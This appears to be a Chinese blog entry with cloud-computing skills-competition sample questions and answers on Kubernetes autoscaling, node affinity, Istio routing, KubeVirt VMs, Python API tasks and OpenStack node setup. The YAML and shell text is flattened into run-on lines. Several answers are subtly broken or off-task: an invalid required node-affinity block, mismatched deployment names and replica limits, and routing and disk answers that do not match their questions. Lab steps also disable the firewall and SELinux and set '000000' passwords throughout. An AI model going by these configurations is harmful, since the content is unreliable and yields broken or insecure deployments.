apiVersion: apps/v1kind: Deploymentmetadata:  name: hap-nginx-deploy  namespace: default  labels:    app: nginx-demospec:  replicas: 1  revisionHistoryLimit: 4  selector:    matchLabels:      app: nginx  template:    metadata:      labels:        app: nginx    spec:      containers:      - name: web        image: nginx        ports:        - containerPort: 80          # 然后创建Deployment：$ kubectl create -f hpa-deploy-demo.yaml# 现在我们来创建一个HPA，可以使用kubectl autoscale命令来创建：$ kubectl autoscale deployment hpa-nginx-deploy --cpu-percent=80 --min=1 --max=100deployment &quot;hpa-nginx-deploy&quot; autoscaled···$ kubectl get hpa                                                         NAME        REFERENCE              TARGET    CURRENT   MINPODS   MAXPODS   AGEhpa-nginx-deploy   Deployment/hpa-nginx-deploy   10%       0%        1         10        13s#此命令创建了一个关联资源 hpa-nginx-deploy 的HPA，最小的 pod 副本数为1，最大为100。HPA会根据设定的 cpu使用率（80%）动态的增加或者减少pod数量。#参考https://www.bookstack.cn/read/rancher-2.4.4-zh/2cf7e056a6f83ec4.md

1.HPA 创建成功得 0.2 分；2.HPA 伸缩策略配置正确得 0.8 分。
【题目 6】节点亲和性管理–创建硬限制规则的 Pod[0.5 分]在 default 命名空间下使用 nginx 镜像运行一个 Pod， 名称为 nginx， 要求使用requiredDuringSchedulingIgnoredDuringExecution 策略将 Pod 调度到具有“disktype&#x3D;ssd”标签的节点。
kubectl label node k8s-worker-node1 disktype=ssdapiVersion: v1kind: Podmetadata:  name: nginxspec:  containers:  - name: nginx    image: nginx:latest  affinity:    nodeAffinity:      requiredDuringSchedulingIgnoredDuringExecution:   #硬性要求，最好放在节点包含disktype=ssd节点上        - weight: 1          preference:            matchExpressions:              - key: disktype                operator: In                values:                  - ssd

完成后提交 master 节点的用户名、密码和 IP 到答题框。1.Pod 调度策略配置正确得 0.5 分。
【题目 7】网络策略管理–创建 Pod 网络策略[0.5 分]创建一个网络策略 network-exam，要求只有 internal 命名空间下的 Pod 可以通过 TCP协议的 8080 端口访问到 mysql 命名空间下的Pod。完成后提交 master 节点的 IP、用户名和密码到答题框。
1.网络策略创建成功得 0.2 分；2.规则配置正确得 0.3 分。
【题目 8】驱逐机制管理–配置节点压力驱逐[0.5 分]设置kubelet 数据存储在&#x2F;apps&#x2F;data&#x2F;kubelet 目录下，并设置当kubelet 的存储空间不足5%， 或者当容器运行时文件系统可用存储空间不足 5%时开始驱逐 Pod。
完成后提交 master 节点的 IP 地址、用户名和密码到答题框。1.节点压力驱逐配置正确得 0.5 分。
【题目 9】流量管理–创建 Ingress Gateway[0.5 分]使用提供的软件包 ServiceMesh.tar.gz 将Bookinfo 应用部署到 default 命名空间下，使用Istio Gateway 可以实现应用程序从外部访问， 请为 Bookinfo 应用创建一个名为bookinfo-gateway 的网关，指定所有 HTTP 流量通过 80 端口流入网格，然后将网关绑定到虚拟服务 bookinfo 上。完成后提交 master 节点的 IP 地址、用户名和密码到答题框。
（2）部署应用程序解压软件包并导入镜像：
[root@k8s-master-node1 ~]# tar -zxf ServiceMesh.tar.gz[root@k8s-master-node1 ~]# cd ServiceMesh/[root@k8s-master-node1 ServiceMesh]# docker load -i images/image.tar
部署应用到Kubernetes集群：
[root@k8s-master-node1 ServiceMesh]# kubectl apply -f bookinfo/bookinfo.yamlservice/details createdserviceaccount/bookinfo-details createddeployment.apps/details-v1 createdservice/ratings createdserviceaccount/bookinfo-ratings createddeployment.apps/ratings-v1 createdservice/reviews createdserviceaccount/bookinfo-reviews createddeployment.apps/reviews-v1 createdservice/productpage createdserviceaccount/bookinfo-productpage createddeployment.apps/productpage-v1 created
Gateway配置文件如下：
[root@k8s-master-node1 ServiceMesh]# cat bookinfo-gateway.yamlapiVersion: networking.istio.io/v1alpha3kind: Gatewaymetadata:name: bookinfo-gatewayspec:selector:  istio: ingressgateway # use istio default controllerservers: - port:    number: 80    name: http    protocol: HTTP  hosts:   - &quot;*&quot;---apiVersion: networking.istio.io/v1alpha3kind: VirtualServicemetadata:name: bookinfospec:hosts: - &quot;*&quot;gateways: - bookinfo-gatewayhttp: - match:   - uri:      exact: /productpage   - uri:      prefix: /static   - uri:      exact: /login   - uri:      exact: /logout   - uri:      prefix: /api/v1/products  route:   - destination:      host: productpage      port:        number: 9080
确认网关创建完成：
[root@k8s-master-node1 ServiceMesh]# kubectl apply -f bookinfo-gateway.yamlgateway.networking.istio.io/bookinfo-gateway createdvirtualservice.networking.istio.io/bookinfo created[root@k8s-master-node1 ServiceMesh]# kubectl get gatewayNAME               AGEbookinfo-gateway       32s


1.Bookinfo 应用部署成功得 0.2 分；2.Bookinfo 能通过网关访问得 0.3 分。
【题目 10】服务网格–创建基于用户身份的路由[0.5 分]创建一个名为 reviews 路由，要求来自名为 Jason 的用户的所有流量将被路由到服务reviews:v2。完成后提交 master 节点的用户名、密码和 IP 到答题框。使用Curl工具向Bookinfo应用发送请求产生模拟流量。
[root@k8s-master-node1 ServiceMesh]# cat curl.sh#!/bin/bashwhile truedo curl http://10.24.2.5:22092/productpage &gt;/dev/null 2&gt;&amp;1 sleep 1done[root@k8s-master-node1 ServiceMesh]# chmod +x curl.sh[root@k8s-master-node1 ServiceMesh]# bash curl.sh &amp;[1] 2924#注意对应地址
编写目标规则配置文件：
[root@k8s-master-node1 ServiceMesh]# cat destination-rule-all.yamlapiVersion: networking.istio.io/v1alpha3kind: DestinationRulemetadata:name: productpagespec:host: productpagesubsets: - name: v1  labels:    version: v1---apiVersion: networking.istio.io/v1alpha3kind: DestinationRulemetadata:name: reviewsspec:host: reviewssubsets: - name: v1  labels:    version: v1 - name: v2  labels:    version: v2 - name: v3  labels:    version: v3---apiVersion: networking.istio.io/v1alpha3kind: DestinationRulemetadata:name: ratingsspec:host: ratingssubsets: - name: v1  labels:    version: v1 - name: v2  labels:    version: v2 - name: v2-mysql  labels:    version: v2-mysql - name: v2-mysql-vm  labels:    version: v2-mysql-vm---apiVersion: networking.istio.io/v1alpha3kind: DestinationRulemetadata:name: detailsspec:host: detailssubsets: - name: v1  labels:    version: v1 - name: v2  labels:    version: v2
创建默认目标规则：
root@k8s-master-node1 ServiceMesh]# kubectl apply -f destination-rule-all.yaml[root@k8s-master-node1 ServiceMesh]# kubectl get destinationruleNAME         HOST       AGEdetails         details       21sproductpage     productpage   21sratings         ratings       21sreviews         reviews       21s#重新部署productpage微服务，启用Istio：[root@k8s-master-node1 ServiceMesh]# cat bookinfo/bookinfo.yaml | istioctl kube-inject -f - | kubectl apply -l app=productpage -f -service/productpage unchangeddeployment.apps/productpage-v1 configured#所有服务启用Istio：[root@k8s-master-node1 ServiceMesh]# cat bookinfo/bookinfo.yaml | istioctl kube-inject -f - | kubectl apply -l app!=productpage -f -#部署v2版本的reviews微服务并开启Istio：[root@k8s-master-node1 ServiceMesh]# cat bookinfo/reviews-v2.yaml | istioctl kube-inject -f - | kubectl apply -f -[root@k8s-master-node1 ServiceMesh]# cat bookinfo/reviews-v3.yaml | istioctl kube-inject -f - | kubectl apply -f -
请求路由
[root@k8s-master-node1 ServiceMesh]# kubectl autoscale deployment reviews-v1 --cpu-percent=50 --min=1 --max=10[root@k8s-master-node1 ServiceMesh]# kubectl autoscale deployment reviews-v2 --cpu-percent=50 --min=1 --max=10[root@k8s-master-node1 ServiceMesh]# kubectl autoscale deployment reviews-v3 --cpu-percent=50 --min=1 --max=10
默认请求路由配置文件如下：
[root@k8s-master-node1 ServiceMesh]# cat virtual-service-all-v1.yamlapiVersion: networking.istio.io/v1alpha3kind: VirtualServicemetadata:name: productpagespec:hosts: - productpagehttp: - route:   - destination:      host: productpage      subset: v1---apiVersion: networking.istio.io/v1alpha3kind: VirtualServicemetadata:name: reviewsspec:hosts: - reviewshttp: - route:   - destination:      host: reviews      subset: v1---apiVersion: networking.istio.io/v1alpha3kind: VirtualServicemetadata:name: ratingsspec:hosts: - ratingshttp: - route:   - destination:      host: ratings      subset: v1---apiVersion: networking.istio.io/v1alpha3kind: VirtualServicemetadata:name: detailsspec:hosts: - detailshttp: - route:   - destination:      host: details      subset: v1
配置默认请求路由：
[root@k8s-master-node1 ServiceMesh]# kubectl apply -f virtual-service-all-v1.yamlvirtualservice.networking.istio.io/productpage createdvirtualservice.networking.istio.io/reviews createdvirtualservice.networking.istio.io/ratings createdvirtualservice.networking.istio.io/details created


1.路由创建成功得 0.2 分；2.用户限制正确得 0.3 分。
【题目 11】服务网格–创建请求路由[0.5 分]在default 命名空间下创建一个名为reviews-route 的虚拟服务，默认情况下，所有的HTTP流量都会被路由到标签为 version:v1 的 reviews 服务的 Pod 上。此外，路径以&#x2F;wpcatalog&#x2F;或&#x2F;consumercatalog&#x2F;开头的HTTP 请求将被重写为&#x2F;newcatalog，并被发送到标签为 version:v2 的Pod 上。完成后提交 master 节点的 IP 地址、用户名和密码到答题框。
使用下面的命令把50%的流量从reviews:v1转移到reviews:v3（金丝雀版本）：
[root@k8s-master-node1 ServiceMesh]# cat virtual-service-reviews-50-50.yamlapiVersion: networking.istio.io/v1alpha3kind: VirtualServicemetadata:name: reviewsspec:hosts:   - reviewshttp: - route:   - destination:      host: reviews      subset: v1    weight: 50   - destination:      host: reviews      subset: v3    weight: 50[root@k8s-master-node1 ServiceMesh]# kubectl apply -f virtual-service-reviews-50-50.yamlvirtualservice.networking.istio.io/reviews configured
假如认为reviews:v3微服务已经稳定，可以通过应用Virtual Service规则将100%的流量路由reviews:v3：
[root@k8s-master-node1 ServiceMesh]# cat virtual-service-reviews-v3.yamlapiVersion: networking.istio.io/v1alpha3kind: VirtualServicemetadata:name: reviewsspec:hosts:   - reviewshttp: - route:   - destination:      host: reviews      subset: v3[root@k8s-master-node1 ServiceMesh]# kubectl apply -f virtual-service-reviews-v3.yamlvirtualservice.networking.istio.io/reviews configured初始化默认路由规则，将所有流量路由到服务的v1版本：[root@k8s-master-node1 ServiceMesh]# kubectl apply -f virtual-service-all-v1.yaml
改变reviews服务的流量规则，将v1版本的流量镜像到v2版本：
[root@k8s-master-node1 ServiceMesh]# cat virtual-service-mirroring.yamlapiVersion: networking.istio.io/v1alpha3kind: VirtualServicemetadata:name: reviewsspec:hosts:   - reviewshttp: - route:   - destination:      host: reviews      subset: v1    weight: 100  mirror:      host: reviews      subset: v2[root@k8s-master-node1 ServiceMesh]# kubectl apply -f virtual-service-mirroring.yamlvirtualservice.networking.istio.io/reviews configured
1.请求路由创建成功得 0.2 分；2.路由策略配置正确得 0.3 分。
【任务 5】容器云服务运维：Kubernetes  基于虚拟机的运维[4.0 分]【题目 1】VM 管理–创建 VM[0.5 分]使用镜像 fedora-virt:v1.0 在 default 命名空间下创建一台 vm，名称为 vm-fedora，内存为1G。完成后提交 master 节点的 IP 地址、用户名和密码到答题框。
#参考官网学习http://kubevirt.io/user-guide/virtual_machines/virtual_machine_instances/apiVersion: kubevirt.io/v1kind: VirtualMachinemetadata:  labels:    kubevirt.io/vm: vm-fedora  name: vm-fedoraspec:  running: false  template:    metadata:      labels:        kubevirt.io/vm: vm-fedora    spec:      domain:        resources:          requests:            memory: 1Gi        devices:          disks:          - name: containerdisk            disk:              bus: virtio      volumes:      - name: containerdisk        containerDisk:          image: fedora-virt:v1.0

1.VM 创建成功得 0.3 分；2.VM 配置正确得 0.2 分。
【题目 2】存储与卷–创建 emptyDisk 卷[1 分]使用镜像 fedora-virt:v1.0 在 default 命名空间下创建一台 vmi，名称为 vmi-fedora，并使用 emptyDisk 卷为 vmi 挂载一块 2G 的磁盘。完成后提交 master 节点的 IP 地址、用户名和密码到答题框。
把上题的磁盘改为2G即可
apiVersion: kubevirt.io/v1kind: VirtualMachinemetadata:  labels:    kubevirt.io/vm: vm-fedora  name: vm-fedoraspec:  running: false  template:    metadata:      labels:        kubevirt.io/vm: vm-fedora    spec:      domain:        resources:          requests:            memory: 2Gi        devices:          disks:          - name: containerdisk            disk:              bus: virtio      volumes:      - name: containerdisk        containerDisk:          image: fedora-virt:v1.0

1.VMI 创建成功得 0.4 分；2.卷挂载成功得 0.6 分。
【题目 3】KubeVirt 运维–创建 VMI[1.5 分]将提供的镜像 exam.qcow2 转换为 docker 镜像 exam:v1.0，然后使用镜像 exam:v1.0 镜像在 default 命名空间下创建一台 vmi，名称为 exam，将虚拟机的 80 端口以 NodePort 的方式对外暴露为 30082，并使用数据源在启动时将 VM 的主机名初始化为exam。完成后提交 master 节点的 IP 地址、用户名和密码到答题框。
1.qcow2 镜像转化成功得 0.3 分；2.VMI 创建成功得 0.3 分；3.端口暴露成功得 0.3 分；4.服务能正常访问得 0.4 分；5.主机名初始化成功得 0.2 分。
【题目 4】KubeVirt 运维–启用快照[1 分]KubeVirt 支持对 VM 进行快照，请启用KubeVirt 快照管理功能： 完成后提交 master 节点的 IP 地址、用户名和密码到答题框。
# 参考官网http://kubevirt.io/user-guide/operations/snapshot_restore_api/

1.快照功能启用成功得 1 分。
【任务 6】容器云运维开发：Kubernetes APIs 运维开发[10 分]【题目 1】Python 运维开发：基于 Kubernetes Restful API 实现 Deployment 创建[2 分]在提供的OpenStack 私有云平台上，使用 k8s-python-dev 镜像创建 1 台云主机，云主机类型使用 4vCPU&#x2F;12G 内存&#x2F;100G 硬盘。该主机中已经默认安装了所需的开发环境，登录默认账号密码为“root&#x2F;1DaoYun@2022”。使用Kubernetes Restful API 库，在&#x2F;root 目录下，创建 api_deployment_manager.py 文件， 要求编写 python 代码，代码实现以下任务：（1）编写 Python 程序实现 Deployment 资源的创建。Deployment 配置信息如下。如果同名Deployment 存在，先删除再创建。（2）创建完成后，查询该Deployment 的详细信息，执行结果控制台输出，以yaml 格式展示。创建Deployment 的yaml 的配置如下：
apiVersion: apps&#x2F;v1 kind: Deployment metadata:name: nginx-deployment labels:app: nginx spec:replicas: 3 selector:matchLabels: app: nginxtemplate: metadata:labels:app: nginx spec:containers:- name: nginximage: nginx:1.15.4 ports:- containerPort: 801.执行api_deployment_manager.py 脚本，成功创建 deployment 资源，计 1 分；2.检查创建的 deployment 资源，配置信息无误计 1 分。
【题目 2】Python 运维开发：基于 Kubernetes Python SDK 实现 Job 创建[1 分]在前面已建好的 Kubernetes 开发环境云平台上。使用 Kubernetes python SDK 的“kubernetes”Python 库，在&#x2F;root 目录下，创建 sdk_job_manager.py 文件，要求编写 python 代码，代码实现以下任务：（1）编写 Python 程序实现 Job 资源的创建。Job 配置信息如下。如果同名 Job 存在， 先删除再创建。（2）创建完成后，查询该 Job 的详细信息，执行结果控制台输出，以 json 格式展示。Job 创建 yaml 的信息如下：
apiVersion: batch&#x2F;v1 kind: Jobmetadata: name: pispec:template: spec:containers:

name: pi image: perlcommand: [“perl”,	“-Mbignum&#x3D;bpi”, “-wle”, “print bpi(2000)”] restartPolicy: NeverbackoffLimit: 4

1.执行 sdk_job_manager.py 脚本，成功创建job 资源，计 0.5 分；2.查询 job 资源，配置信息无误，计 0.5 分。
【题目 3】Python 运维开发：Pod 资源的 Restful APIs HTTP 服务封装[3 分]编写 Python 程序实现Pod 资源管理程序，将 Pod 资源管理的封装成Web 服务。
在&#x2F;root 目录下创建pod_server.py 程序，实现Pod 的增删查改等Web 访问操作。http.server 的 host 为 localhost，端口 8889；程序内部实现Kubernetes 认证。提示说明：Python 标准库http.server 模块，提供了HTTP Server 请求封装。需要实现的 Restful API 接口如下：GET &#x2F;pod&#x2F;{name} ，查询指定名称{name}的 Pod；Response 的 Body 以 json 格式输出。POST &#x2F;pod&#x2F;{yamlfilename} 创建 yaml 文件名称为{yamlfilename}的 Pod；Response 的Body 以 json 格式。编码完成后，“手工下载”文件服务器主目录所有*.yaml 文件到 root 目录下，“手动执行”所编写pod_server.py 程序，提交答案进行检测。
1.HTTP 服务成功启动，计 1 分；2.发起指定参数的GET 查询 Pod 请求，成功查询指定名称的 pod 服务，计 1 分；3.发起指定参数的 POST 创建 Pod 请求，成功创建 Pod 服务，计 1 分。
【题目 4】Python 运维开发：Service 资源 Restful APIs HTTP 服务封装[4 分]编写 Python 程序实现 Service 资源管理程序，将 Service 资源管理的封装成 Web 服务。在&#x2F;root 目录下创建 service_server.py 程序，实现 Service 的增删查改等 Web 访问操作。http.server 的 host 为 localhost，端口 8888；程序内部实现Kubernetes 认证。
提示说明：Python 标准库http.server 模块，提供了HTTP Server 请求封装。需要实现的 Restful API 接口如下：GET &#x2F;services&#x2F;{name}，查询指定名称{name}的 Service；Response 的 Body 以 json 格式输出。POST &#x2F;services&#x2F;{yamlfilename} 创建yaml 文件名称为{yamlfilename}的 Service； Response 的Body 以 json 格式，（手工将文件服务器主目录所有*.yaml 文件下载到 root 目录下）。DELETE &#x2F;services&#x2F;{name}；删除指定名称的 Service；Response 的 Body 以 json 格式。编码完成后，自己手动执行提供 Web HTTP 服务的 service_server.py 程序，提交答案进行检测。
1.HTTP 服务成功启动，计 1 分；2.发起指定参数的 POST 创建 service 请求，成功创建 service 资源，计 1 分；3.发起指定参数的GET 查询 service 请求，成功查询指定名称的 Service，计 1 分；4.发起指定参数的DELETE 删除 service 请求，成功删除指定名称的 Service，计 1 分
]]></content>
      <categories>
        <category>云计算</category>
        <category>技能大赛汇总</category>
      </categories>
      <tags>
        <tag>云计算</tag>
        <tag>云计算职业技能大赛</tag>
      </tags>
  </entry>
  <entry>
    <title>云计算方向-2022年云计算技能大赛样题</title>
    <url>/posts/c134dd26.html</url>
    <content><![CDATA[A模块：OpenStack平台部署与运维（样题）业务场景：
某企业拟使用OpenStack搭建一个企业云平台，用于部署各类企业应用对外对内服务。云平台可实现IT资源池化，弹性分配，集中管理，性能优化以及统一安全认证等。系统结构如下图
企业云平台的搭建使用竞赛平台提供的两台云服务器，配置如下表：
说明:
①选手自行检查工位pc机硬件及网络是否正常;1.选手自行检查工位PC机硬件及网络是否正常；
②竞赛使用集群模式进行，给每个参赛队提供华为云账号和密码及考试系统的账号和密码。选手通过用户名与密码分别登录华为云和考试系统;
③考试用到的软件包都在云主机&#x2F;opt下。
④表1中的公网IP和私网IP以自己云主机显示为准，每个人的公网IP和私网IP不同。使用第三方软件远程连接云主机，使用公网IP连接。
任务1私有云平台环境初始化①根据表1中的IP地址规划，设置各服务器节点的IP地址，确保网络正常通信，设置云服务器1主机名为Controller，云服务器2主机名为Compute，并修改hosts文件将IP地址映射为主机名，关闭防火墙并设置为开机不启动，设置SELinux为Permissive 模式。
[root@localhost ~]# hostnamectl set-hostname controller###ip地址映射主机,注意该ip地址为自身环境地址[root@localhost ~]# vi /etc/hosts[root@localhost ~]# cat /etc/hosts127.0.0.1   localhost localhost.localdomain localhost4 localhost4.localdomain4::1         localhost localhost.localdomain localhost6 localhost6.localdomain6192.168.157.20 controller192.168.157.21 compute###关闭防火墙[root@localhost ~]# systemctl stop firewalld &amp;&amp; systemctl disable firewalldRemoved symlink /etc/systemd/system/multi-user.target.wants/firewalld.serviceRemoved symlink /etc/systemd/system/dbus-org.fedoraproject.FirewallD1.service##关闭安全策略[root@localhost ~]# setenforce 0[root@localhost ~]# cat /etc/selinux/config  | grep -v ^$ | grep -v ^#SELINUX=permissiveSELINUXTYPE=targeted##compute节点修改主机名即可,其他配置相同

②将提供的CentOS-7-x86_64-DVD-1804.iso和qdkills_cloud_iaas.iso光盘镜像上传到Compute节点的&#x2F;root目录下，然后在&#x2F;opt目录下分别创建centos目录和openstack目录，并将镜像文件CentOS-7-x86_64-DVD-1804.iso挂载到centos目录下，将镜像文件qdkills_cloud_iaas.iso挂载到openstack目录下。
[root@localhost ~]# mkdir /opt/centos[root@localhost ~]# mkdir /opt/openstack[root@localhost ~]# mount CentOS-7-x86_64-DVD-1804.iso /opt/centos/mount: /dev/loop0 is write-protected, mounting read-only[root@localhost ~]# mount chinaskills_cloud_iaas.iso /opt/openstack/mount: /dev/loop1 is write-protected, mounting read-only

③在Compute节点上利用centos目录中的软件包安装vsftpd服务器并设置开机自启动，提供yum仓库服务，并分别设置controller节点和compute节点的yum源文件ftp.repo，其中节点的地址使用IP形式。
在compute节点
[root@localhost ~]# mv /etc/yum.repos.d/CentOS-* /home/[root@localhost ~]# vi /etc/yum.repos.d/ftp.repo[centos]name=centosbaseurl=file:///opt/centosgpgcheck=0enabled=1[openstack]name=centosbaseurl=file:///opt/openstack/iaas-repogpgcheck=0enabled=1[root@localhost ~]# yum repolist##安装并配置vsftp[root@localhost ~]# yum install -y vsftpd[root@localhost ~]# echo &quot;anon_root=/opt&quot; &gt;&gt; /etc/vsftpd/vsftpd.conf[root@localhost ~]# systemctl enable --now vsftpdCreated symlink from /etc/systemd/system/multi-user.target.wants/vsftpd.service to /usr/lib/systemd/system/vsftpd.service.

在controller节点
[root@localhost ~]# cat /etc/yum.repos.d/ftp.repo[centos]name=centosbaseurl=ftp://compute/centosenabled=1gpgcheck=0[openstack]name=centosbaseurl=ftp://compute/openstack/iaas-repoenabled=1gpgcheck=0[root@localhost ~]# yum repolist

④在Controller节点上部署chrony服务器，允许其他节点同步时间，启动服务并设置为开机启动；并在compute节点上指定controller节点为上游NTP服务器，重启服务并设为开机启动。
controller节点
vi /etc/chrony.conf# Use public servers from the pool.ntp.org project.# Please consider joining the pool (http://www.pool.ntp.org/join.html).#server 0.centos.pool.ntp.org iburst#server 1.centos.pool.ntp.org iburst#server 2.centos.pool.ntp.org iburst#server 3.centos.pool.ntp.org iburstserver controller iburst# Record the rate at which the system clock gains/losses time.driftfile /var/lib/chrony/drift# Allow the system clock to be stepped in the first three updates# if its offset is larger than 1 second.makestep 1.0 3# Enable kernel synchronization of the real-time clock (RTC).rtcsync# Enable hardware timestamping on all interfaces that support it.#hwtimestamp *# Increase the minimum number of selectable sources required to adjust# the system clock.#minsources 2# Allow NTP client access from local network.#allow 192.168.0.0/16# Serve time even if not synchronized to a time source.#local stratum 10# Specify file containing keys for NTP authentication.#keyfile /etc/chrony.keys# Specify directory for log files.logdir /var/log/chrony# Select which information is logged.#log measurements statistics trackingallow 192.168.157.0/24local stratum 10###使配置生效systemctl restart chronydsystemctl enable chronydchronyc sources

compute节点
vi /etc/chrony.conf# Use public servers from the pool.ntp.org project.# Please consider joining the pool (http://www.pool.ntp.org/join.html).#server 0.centos.pool.ntp.org iburst#server 1.centos.pool.ntp.org iburst#server 2.centos.pool.ntp.org iburst#server 3.centos.pool.ntp.org iburstserver controller iburst# Record the rate at which the system clock gains/losses time.driftfile /var/lib/chrony/drift# Allow the system clock to be stepped in the first three updates# if its offset is larger than 1 second.makestep 1.0 3# Enable kernel synchronization of the real-time clock (RTC).rtcsync# Enable hardware timestamping on all interfaces that support it.#hwtimestamp *# Increase the minimum number of selectable sources required to adjust# the system clock.#minsources 2# Allow NTP client access from local network.#allow 192.168.0.0/16# Serve time even if not synchronized to a time source.#local stratum 10# Specify file containing keys for NTP authentication.#keyfile /etc/chrony.keys# Specify directory for log files.logdir /var/log/chrony# Select which information is logged.#log measurements statistics tracking###使配置生效systemctl restart chronydsystemctl enable chronydchronyc sources

⑤在compute节点上查看分区情况，并利用空白分区划分2个20G分区。
compute节点
##查看空白分区[root@localhost ~]# lsblkNAME            MAJ:MIN RM  SIZE RO TYPE MOUNTPOINTsda               8:0    0   50G  0 disk├─sda1            8:1    0    1G  0 part /boot└─sda2            8:2    0   49G  0 part  ├─centos-root 253:0    0   44G  0 lvm  /  └─centos-swap 253:1    0    5G  0 lvm  [SWAP]sdb               8:16   0   40G  0 disksr0              11:0    1 1024M  0 rom[root@localhost ~]# fdisk /dev/sdbWelcome to fdisk (util-linux 2.23.2).Changes will remain in memory only, until you decide to write them.Be careful before using the write command.Device does not contain a recognized partition tableBuilding a new DOS disklabel with disk identifier 0x4cacbd86.Command (m for help): nPartition type:   p   primary (0 primary, 0 extended, 4 free)   e   extendedSelect (default p):Using default response pPartition number (1-4, default 1):First sector (2048-83886079, default 2048):Using default value 2048Last sector, +sectors or +size&#123;K,M,G&#125; (2048-83886079, default 83886079): +20GPartition 1 of type Linux and of size 20 GiB is setCommand (m for help): nPartition type:   p   primary (1 primary, 0 extended, 3 free)   e   extendedSelect (default p):Using default response pPartition number (2-4, default 2):First sector (41945088-83886079, default 41945088):Using default value 41945088Last sector, +sectors or +size&#123;K,M,G&#125; (41945088-83886079, default 83886079): +20GUsing default value 83886079Partition 2 of type Linux and of size 20 GiB is setCommand (m for help): wThe partition table has been altered!Calling ioctl() to re-read partition table.Syncing disks.

任务2 OpenStack平台搭建①在 controller 节点和 compute 节点分别安装 iaas-xiandian 软件包，修改脚本文件基本变量（脚本文件为&#x2F;etc&#x2F;xiandian&#x2F;openrc.sh），修改完成后使用命令生效该脚本文件。
②在 compute 节点配置&#x2F;etc&#x2F;xiandian&#x2F;openrc.sh 文件，根据环境情况修改参数，块存储服务的后端使用第二块硬盘的第一个分区，生效该参数文件。
controller节点
[root@localhost ~]# yum install -y iaas-xiandian[root@localhost ~]# vi /etc/xiandian/openrc.sh[root@localhost ~]# cat /etc/xiandian/openrc.sh | grep -v ^$ | grep -v ^#HOST_IP=192.168.157.20HOST_PASS=000000HOST_NAME=controllerHOST_IP_NODE=192.168.157.21HOST_PASS_NODE=000000HOST_NAME_NODE=computenetwork_segment_IP=192.168.157.0/24RABBIT_USER=openstackRABBIT_PASS=000000DB_PASS=000000DOMAIN_NAME=demoADMIN_PASS=000000DEMO_PASS=000000KEYSTONE_DBPASS=000000GLANCE_DBPASS=000000GLANCE_PASS=000000NOVA_DBPASS=000000NOVA_PASS=000000NEUTRON_DBPASS=000000NEUTRON_PASS=000000METADATA_SECRET=000000INTERFACE_IP=192.168.157.20INTERFACE_NAME=ens34Physical_NAME=providerminvlan=101maxvlan=200CINDER_DBPASS=000000CINDER_PASS=000000BLOCK_DISK=sdb1SWIFT_PASS=000000OBJECT_DISK=sdb2STORAGE_LOCAL_NET_IP=192.168.157.21HEAT_DBPASS=000000HEAT_PASS=000000ZUN_DBPASS=000000ZUN_PASS=000000KURYR_DBPASS=000000KURYR_PASS=000000CEILOMETER_DBPASS=000000CEILOMETER_PASS=000000AODH_DBPASS=000000AODH_PASS=000000BARBICAN_DBPASS=000000BARBICAN_PASS=000000##将配置文件复制到compute[root@localhost ~]# scp /etc/xiandian/openrc.sh root@compute:/etc/xiandian/openrc.shThe authenticity of host &#x27;compute (192.168.157.21)&#x27; can&#x27;t be established.ECDSA key fingerprint is SHA256:571qhtjNb3asAlUU69GoE8W2Eel7T4VD8/VbitmzBxQ.ECDSA key fingerprint is MD5:9d:69:e5:7f:58:f8:84:87:9c:d2:1a:39:7b:9f:53:03.Are you sure you want to continue connecting (yes/no)? yesWarning: Permanently added &#x27;compute,192.168.157.21&#x27; (ECDSA) to the list of known hosts.root@compute&#x27;s password:openrc.sh                                                                                                                  100% 3819     2.5MB/s   00:00

compute节点:
[root@localhost ~]# cat /etc/xiandian/openrc.sh#--------------------system Config--------------------###Controller Server Manager IP. example:x.x.x.xHOST_IP=192.168.157.20#Controller HOST Password. example:000000HOST_PASS=000000#Controller Server hostname. example:controllerHOST_NAME=controller#Compute Node Manager IP. example:x.x.x.xHOST_IP_NODE=192.168.157.21#Compute HOST Password. example:000000HOST_PASS_NODE=000000#Compute Node hostname. example:computeHOST_NAME_NODE=compute#--------------------Chrony Config-------------------###Controller network segment IP.  example:x.x.0.0/16(x.x.x.0/24)network_segment_IP=192.168.157.0/24#--------------------Rabbit Config ------------------###user for rabbit. example:openstackRABBIT_USER=openstack#Password for rabbit user .example:000000RABBIT_PASS=000000#--------------------MySQL Config---------------------###Password for MySQL root user . exmaple:000000DB_PASS=000000#--------------------Keystone Config------------------###Password for Keystore admin user. exmaple:000000DOMAIN_NAME=demoADMIN_PASS=000000DEMO_PASS=000000#Password for Mysql keystore user. exmaple:000000KEYSTONE_DBPASS=000000#--------------------Glance Config--------------------###Password for Mysql glance user. exmaple:000000GLANCE_DBPASS=000000#Password for Keystore glance user. exmaple:000000GLANCE_PASS=000000#--------------------Nova Config----------------------###Password for Mysql nova user. exmaple:000000NOVA_DBPASS=000000#Password for Keystore nova user. exmaple:000000NOVA_PASS=000000#--------------------Neturon Config-------------------###Password for Mysql neutron user. exmaple:000000NEUTRON_DBPASS=000000#Password for Keystore neutron user. exmaple:000000NEUTRON_PASS=000000#metadata secret for neutron. exmaple:000000METADATA_SECRET=000000#Tunnel Network Interface. example:x.x.x.xINTERFACE_IP=192.168.157.21#External Network Interface. example:eth1INTERFACE_NAME=ens34#External Network The Physical Adapter. example:providerPhysical_NAME=provider#First Vlan ID in VLAN RANGE for VLAN Network. exmaple:101minvlan=101#Last Vlan ID in VLAN RANGE for VLAN Network. example:200maxvlan=200#--------------------Cinder Config--------------------###Password for Mysql cinder user. exmaple:000000CINDER_DBPASS=000000#Password for Keystore cinder user. exmaple:000000CINDER_PASS=000000#Cinder Block Disk. example:md126p3BLOCK_DISK=sdb1#--------------------Swift Config---------------------###Password for Keystore swift user. exmaple:000000SWIFT_PASS=000000#The NODE Object Disk for Swift. example:md126p4.OBJECT_DISK=sdb2#The NODE IP for Swift Storage Network. example:x.x.x.x.STORAGE_LOCAL_NET_IP=192.168.157.21#--------------------Heat Config----------------------###Password for Mysql heat user. exmaple:000000HEAT_DBPASS=000000#Password for Keystore heat user. exmaple:000000HEAT_PASS=000000#--------------------Zun Config-----------------------###Password for Mysql Zun user. exmaple:000000ZUN_DBPASS=000000#Password for Keystore Zun user. exmaple:000000ZUN_PASS=000000#Password for Mysql Kuryr user. exmaple:000000KURYR_DBPASS=000000#Password for Keystore Kuryr user. exmaple:000000KURYR_PASS=000000#--------------------Ceilometer Config----------------###Password for Gnocchi ceilometer user. exmaple:000000CEILOMETER_DBPASS=000000#Password for Keystore ceilometer user. exmaple:000000CEILOMETER_PASS=000000#--------------------AODH Config----------------###Password for Mysql AODH user. exmaple:000000AODH_DBPASS=000000#Password for Keystore AODH user. exmaple:000000AODH_PASS=000000#--------------------Barbican Config----------------###Password for 